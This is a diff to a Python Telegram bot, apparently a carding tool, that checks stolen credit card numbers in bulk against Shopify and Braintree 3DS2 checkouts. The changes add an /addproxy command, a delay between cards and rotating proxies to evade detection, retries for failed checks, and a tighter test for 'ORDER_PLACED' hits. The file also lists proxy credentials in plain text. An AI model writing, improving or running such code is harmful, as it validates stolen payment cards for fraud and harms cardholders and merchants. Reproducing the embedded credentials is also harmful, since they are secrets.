@@ -30,32 +30,24 @@ def banner():
    ╚═════╝    ╚═╝       ╚═════╝╚═╝  ╚═╝
 """
     for l in art.strip("\n").split("\n"): print(grad(l))
-    print(f"  {C.D}Shopify + Braintree 3DS2  |  {C.B}{C.GOLD}v2.2{C.R}{C.D}  |  Termux/Pydroid{C.R}\n")
+    print(f"  {C.D}Shopify + Braintree 3DS2  |  {C.B}{C.GOLD}v4.0{C.R}{C.D}  |  W2 + AddProxy{C.R}\n")
 
 # ---------- Config ----------
 BATCH_MAX      = 1000
-MSG_PER_BATCH  = 20
+MSG_PER_BATCH  = 10
 PROGRESS_EVERY = 50
 TG_SEND_DELAY  = 0.05
 RESULT_DIR     = "./results"
 os.makedirs(RESULT_DIR, exist_ok=True)
 
 TG_W           = 2          # total workers / lanes
+CARD_DELAY     = 2.0        # ကဒ်တစ်ခုနဲ့တစ်ခုကြား စောင့်ချိန် (စက္ကန့်)
 
 # ---------- Proxies ----------
+# Proxy တွေ အကုန်ဒီမှာ ထည့်ပါ (Public ရော Private ရော)
 RAW_PROXIES=[
     "46.225.138.35:36759:l1lo6k6xsj:OetadXmeuu",
     "172.93.105.208:43159:8u74d0ud33:nfRkcoqOel",
-    "172.93.105.208:43159:fsf409q9t6:eZ7Zr0QeM5",
-    "172.93.104.131:39603:i75k6kfk8x:ILug9moRKgL",
-    "172.93.104.131:39603:ncgh2p1l48:M9y57cFm1E",
-    "46.225.138.35:36759:6sw3iikwca:3q4owzbDzK",
-    "46.225.138.35:36759:6omuputmz1:s5GozZaMzC",
-    "172.93.105.208:43159:63hqmnwasr:Ng4RhfT2Vy",
-    "172.93.105.208:43159:bcwbryzsb7:OVpg6AsDMQ",
-    "172.93.105.208:43159:ztjuvz66ax:mpJxWou9Kt",
-    "46.225.138.35:36759:mr8v3lfvyg:xbkjKUqN8R",
-    "104.219.238.237:43645:t4a77l4bxe:pr3529Gknr",
 ]
 WORKING=[]; _PI=0; _PLK=threading.Lock()
 
@@ -68,17 +60,25 @@ def _tp(url):
         except: pass
     return False
 
-def validate_proxies():
+def validate_proxies(proxies_to_check):
     global WORKING
-    print(f"{C.CYN}{C.B}◆ Proxy Validation{C.R}  {C.D}({len(RAW_PROXIES)} proxies × 3 formats){C.R}\n")
-    tot=len(RAW_PROXIES); w=[]; done=0; lk=threading.Lock()
+    if not proxies_to_check:
+        WORKING = []
+        return 0, 0
+    print(f"{C.CYN}{C.B}◆ Proxy Validation{C.R}  {C.D}({len(proxies_to_check)} proxies){C.R}\n")
+    tot=len(proxies_to_check); w=[]; done=0; lk=threading.Lock()
     def run(raw):
         nonlocal done
-        parts=raw.split(":"); found=None
+        parts=raw.strip().split(":"); found=None
         if len(parts)==4:
             ip,pt,u,pw=parts
             for sch in ("http","socks5h","socks5"):
                 url=f"{sch}://{u}:{pw}@{ip}:{pt}"
+                if _tp(url): found={"url":url,"raw":raw,"sch":sch}; break
+        elif len(parts)==2:
+            ip,pt=parts
+            for sch in ("http","socks5h","socks5"):
+                url=f"{sch}://{ip}:{pt}"
                 if _tp(url): found={"url":url,"raw":raw,"sch":sch}; break
         with lk:
             done+=1
@@ -87,15 +87,12 @@ def validate_proxies():
             bar=f"{C.GRN}{'█'*pct}{C.D}{'░'*(30-pct)}{C.R}"
             s=f"{C.LIME}✓{C.R}" if found else f"{C.RED}✗{C.R}"
             print(f"\r  {bar}  {done:>2}/{tot}  {C.GOLD}ok={len(w)}{C.R}  {s}",end="",flush=True)
-    ts=[threading.Thread(target=run,args=(r,)) for r in RAW_PROXIES]
+    ts=[threading.Thread(target=run,args=(r,)) for r in proxies_to_check]
     [t.start() for t in ts]; [t.join() for t in ts]
     print()
     WORKING=w
     print(f"\n  {C.LIME}✓{C.R} {C.B}Working: {C.GOLD}{len(w)}/{tot}{C.R}\n")
-    for i,x in enumerate(w,1):
-        ip=x["raw"].split(":")[0]
-        print(f"  {C.D}[{i:>2}]{C.R} {C.GOLD}{ip:<18}{C.R} {C.D}{x['sch']}{C.R}")
-    print()
+    return len(w), tot
 
 def get_proxy():
     global _PI
@@ -454,7 +451,7 @@ async def process_card(cc,mes,ano,cvv,site,vid=None):
             if 'WaitingReceipt' in ft: return False,"Change Proxy",gw,tp,cur
             try:
                 rj=json.loads(ft); result=rj.get('data',{}).get('receipt',{}).get('processingError',{}).get('code')
-                if "shopify_payments" in str(rj): return True,"ORDER_PLACED",gw,tp,cur
+                if "shopify_payments" in str(rj) and "DECLINED" not in str(rj): return True,"ORDER_PLACED",gw,tp,cur
                 elif result: return True,result,gw,tp,cur
                 return True,"MISMATCHED_BILL",gw,tp,cur
             except: pass
@@ -523,7 +520,6 @@ _batch_lock=threading.Lock()
 _batch_seq=0
 _batches=OrderedDict()
 
-# per-worker lanes; each batch pinned to one lane
 _lanes=[_q.Queue() for _ in range(TG_W)]
 _lane_rr={"i":0}
 _lane_rr_lock=threading.Lock()
@@ -635,6 +631,7 @@ def _worker(wid, lane):
 
         with _slk: _st["r"]+=1
         try:
+            time.sleep(CARD_DELAY) 
             p=parse_cc(ccs); t0=time.time()
             if mode=="bt":
                 succ,msg,gw,prc,cur=bt_check(p['cc'],p['mes'],p['ano'],p['cvv'])
@@ -649,43 +646,65 @@ def _worker(wid, lane):
                  "price":prc,"cur":cur,"el":el,"bin":bin_line(p['cc']),
                  "succ":succ,"idx":idx}
 
-            with _slk:
-                _st["p"]+=1
-                if succ: _st["live"]+=1
-                else:    _st["dead"]+=1
+            is_error = any(err in cl.upper() for err in ["LOOKUP ERROR", "NO SESSION", "BAD JSON", "REQ FAILED", "PROXY", "TIMEOUT", "ERROR"])
+            
+            rows_to_send=[]; prog=False; finished=False; done_n=0; total=0; retries=[]
 
-            rows_to_send=[]; prog=False; finished=False; done_n=0; total=0
-            with _batch_lock:
-                b=_batches.get(bid) if bid is not None else None
-                if b:
-                    b["done"].append(row)
-                    b["pending_rows"].append(row)
-                    done_n=len(b["done"]); total=b["total"]
-                    flush = len(b["pending_rows"])>=MSG_PER_BATCH
-                    prog  = (done_n % PROGRESS_EVERY==0 and done_n<total)
-                    finished = (done_n==total)
-                    if flush:
-                        rows_to_send=list(b["pending_rows"])
-                        b["pending_rows"].clear()
+            if is_error and bid is not None:
+                with _batch_lock:
+                    b=_batches.get(bid)
+                    if b:
+                        b["retry_queue"].append((mode,cid,mid,site,ccs,None,bid,idx))
+                        row = None 
+            else:
+                with _slk:
+                    _st["p"]+=1
+                    if succ: _st["live"]+=1
+                    else:    _st["dead"]+=1
+
+            if row is not None:
+                with _batch_lock:
+                    b=_batches.get(bid) if bid is not None else None
+                    if b:
+                        b["done"].append(row)
+                        b["pending_rows"].append(row)
+                        done_n=len(b["done"]); total=b["total"]
+                        flush = len(b["pending_rows"])>=MSG_PER_BATCH
+                        prog  = (done_n % PROGRESS_EVERY==0 and done_n<total)
+                        finished = (done_n==total)
+                        if flush:
+                            rows_to_send=list(b["pending_rows"])
+                            b["pending_rows"].clear()
 
             if rows_to_send:
                 _send(cid,_result_block(rows_to_send),rt=mid,pm="HTML")
             if prog:
                 _send(cid,f"⏳ <b>Batch #{bid}</b> · {done_n}/{total} done",rt=mid,pm="HTML")
+                
             if finished:
                 with _batch_lock:
-                    b=_batches.pop(bid,None)
-                if b:
+                    b=_batches.get(bid)
+                    if b and b.get("retry_queue"):
+                        retries = list(b["retry_queue"])
+                        b["retry_queue"].clear()
+                        finished = False
+                    else:
+                        b=_batches.pop(bid,None)
+                
+                if finished and b:
                     if b["pending_rows"]:
                         _send(cid,_result_block(b["pending_rows"]),rt=mid,pm="HTML")
                     _send(cid,_batch_summary(b),rt=mid,pm="HTML")
                     try:
                         path=_dump_batch_file(b)
-                        _send_file(cid,path,
-                                   caption=f"batch #{b['bid']} results · {len(b['done'])} cards",
-                                   rt=mid)
+                        _send_file(cid,path, caption=f"batch #{b['bid']} results · {len(b['done'])} cards", rt=mid)
                     except Exception as e:
                         print(f"{C.D}[TG] dump: {e}{C.R}")
+                        
+            for r_item in retries:
+                _lanes[lane].put(r_item)
+                with _slk: _st["q"]+=1
+
         except Exception as e:
             with _slk: _st["f"]+=1
             try: _send(cid,f"⚠️ {_esc(e)}",rt=mid,pm="HTML")
@@ -714,7 +733,7 @@ def _enqueue_batch(mode,cid,mid,site,ccs_list,invalid):
         _batches[bid]={"bid":bid,"cid":cid,"mid":mid,"mode":mode,"site":site,
                        "cards":list(ccs_list),"done":[],"pending_rows":[],
                        "invalid":list(invalid),"total":len(ccs_list),
-                       "lane":lane}
+                       "lane":lane, "retry_queue": []}
     hdr=(f"📥 <b>Batch #{bid}</b> · {len(ccs_list)} card(s) queued · lane {lane+1}"
          + (f"\n⚠️ {len(invalid)} invalid skipped" if invalid else ""))
     _send(cid,hdr,rt=mid,pm="HTML")
@@ -737,6 +756,17 @@ def _handle(u):
         _send(cid,_help(),rt=mid,pm="HTML"); return
     if txt in ("/queue","/status"):
         _send(cid,_status(),rt=mid,pm="HTML"); return
+    
+    if txt.startswith("/addproxy"):
+        raw=txt[9:].strip()
+        if not raw:
+            _send(cid,"❌ <code>/addproxy ip:port</code> or <code>/addproxy ip:port:user:pass</code>",rt=mid,pm="HTML"); return
+        new_px = [line.strip() for line in raw.split("\n") if line.strip()]
+        global WORKING
+        _send(cid, f"🔄 Testing {len(new_px)} proxies...", rt=mid, pm="HTML")
+        w, t = validate_proxies(new_px)
+        _send(cid, f"✅ <b>Added {w} working proxies.</b>\n▸ Total Working: <b>{len(WORKING)}</b>", rt=mid, pm="HTML")
+        return
 
     if txt.startswith("/bt"):
         raw=txt[3:].strip()
@@ -802,7 +832,7 @@ if __name__=="__main__":
     os.system("clear" if os.name!="nt" else "cls")
     banner()
     ask_creds()
-    validate_proxies()
+    validate_proxies(RAW_PROXIES)
     print(f"{C.CYN}{C.B}◆ Starting Services{C.R}\n")
     tg_start()
     print(f"{C.LIME}{C.B}  ⚡ Bot is live  ⚡{C.R}")
